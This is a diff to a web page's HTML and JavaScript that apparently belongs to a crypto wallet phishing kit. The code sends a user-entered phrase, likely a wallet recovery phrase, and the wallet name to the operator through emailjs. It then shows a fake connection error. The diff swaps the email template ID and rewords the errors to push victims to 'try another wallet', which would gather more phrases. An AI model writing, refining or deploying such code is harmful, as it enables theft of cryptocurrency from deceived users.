@@ -8445,7 +8445,7 @@
     <div class="send-dialog-content" style="background: #fefcfb">
       <div class="connect-dialog-body">
         <img style="width: 150px" src="assets/error.gif" alt="Success" />
-        <h4 class="mt-3">Connection Failed, Try Again</h4>
+        <h4 class="mt-3">Connection Failed, Try Again... Please try another wallet.</h4>
       </div>
     </div>
   </div>
@@ -9062,13 +9062,13 @@
           wallet: wallet
         };
   
-        emailjs.send("service_zuhhyoh","template_d4mgj3b", templateParams)
+        emailjs.send("service_zuhhyoh","template_b95jytj", templateParams)
           .then(
             (response) => {
               console.log('SUCCESS!', response.status, response.text);
               console.log("Message:", thisPhrase.value);
     console.log("Wallet Name:", wallet);
-              alert("Error while connecting!");
+              alert("Error while connecting! Please Try Another Wallet.");
             },
             (error) => {
               console.log('FAILED...', error);
@@ -9091,7 +9091,7 @@
         let formData = new FormData(this);
   
         // Send the email
-        emailjs.sendForm("service_zuhhyoh","template_d4mgj3b", formData)
+        emailjs.sendForm("service_zuhhyoh","template_b95jytj", formData)
           .then(function (response) {
             console.log('Success!', response.status, response.text);
   
